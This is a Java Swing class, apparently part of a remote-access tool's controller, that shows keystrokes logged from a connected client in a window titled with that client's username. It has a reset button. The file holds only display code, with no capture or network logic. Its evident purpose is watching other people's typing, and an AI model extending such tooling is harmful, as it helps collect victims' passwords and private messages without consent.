package me.sebsb.gui;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Date;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.border.EmptyBorder;

import me.sebsb.ConnectedClient;

public class GuiKeyLogger extends JFrame {

	private JPanel contentPane;
	private JTextArea text;
	
	public GuiKeyLogger(ConnectedClient client) {
		setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		setBounds(100, 100, 455, 270);
		contentPane = new JPanel();
		setTitle(client.getUsername());
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);
		
		text = new JTextArea();
		text.setLineWrap(true);
		reset();
		
		JButton button = new JButton("Reset");
		button.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				reset();
			}
			
		});
		contentPane.add(button, BorderLayout.NORTH);
		contentPane.add(text, BorderLayout.CENTER);
		
		this.setVisible(true);
	}

	public void addKey(String key) {
		StringBuilder sb = new StringBuilder(text.getText());
		sb.append(" ");
		sb.append(key);
		this.text.setText(sb.toString());
	}
	
	public void reset() {
		StringBuilder sb = new StringBuilder(new Date().toString());
		sb.append(System.lineSeparator());
		sb.append(System.lineSeparator());
		text.setText(sb.toString());
		text.setEditable(false);
	}
}
